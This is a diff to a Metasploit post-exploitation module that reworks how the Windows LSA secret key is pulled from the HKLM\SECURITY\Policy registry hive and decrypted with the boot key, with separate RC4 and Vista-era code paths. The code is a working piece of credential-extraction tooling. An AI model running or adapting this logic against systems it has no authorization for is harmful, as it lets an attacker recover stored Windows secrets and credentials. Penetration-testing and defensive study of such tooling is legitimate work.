@@ -164,23 +164,6 @@ module Msf::Post::Windows::Priv
     if pol
       print_status("XP or below client")
       @vista = 0
-    else
-      vprint_status("Trying 'V72' style...")
-      vprint_status("Getting PolEKList...")
-      pol = registry_getvaldata("HKLM\\SECURITY\\Policy\\PolEKList", "")
-      print_status("Vista or above client")
-      @vista = 1
-    end
-    # If that didn't work, then we're out of luck
-    return nil if pol.nil?
-
-    vprint_good("Pol: #{pol.unpack("H*")[0]}")
-
-    if @vista == 1
-      lsakey = decrypt_lsa_data(pol, bootkey)
-      lsakey = lsakey[68,32]
-      vprint_good(lsakey.unpack("H*")[0])
-    else
       md5x = Digest::MD5.new()
       md5x << bootkey
       (1..1000).each do
@@ -189,11 +172,26 @@ module Msf::Post::Windows::Priv
 
       rc4 = OpenSSL::Cipher::Cipher.new("rc4")
       rc4.key = md5x.digest
-      lsakey  = rc4.update(pol[12,48])
-      lsakey << rc4.final
-      lsakey = lsakey[0x10..0x1F]
+      lsa_key  = rc4.update(pol[12,48])
+      lsa_key << rc4.final
+      lsa_key = lsa_key[0x10..0x1F]
+    else
+      print_status("Vista or above client")
+      @vista = 1
+
+      vprint_status("Trying 'V72' style...")
+      vprint_status("Getting PolEKList...")
+      pol = registry_getvaldata("HKLM\\SECURITY\\Policy\\PolEKList", "")
+
+      # If that didn't work, then we're out of luck
+      return nil if pol.nil?
+
+      lsa_key = decrypt_lsa_data(pol, bootkey)
+      lsa_key = lsa_key[68,32]
     end
-    return lsakey
+
+    vprint_good(lsa_key.unpack("H*")[0])
+    return lsa_key
   end
 
   # Decrypts the LSA encrypted data
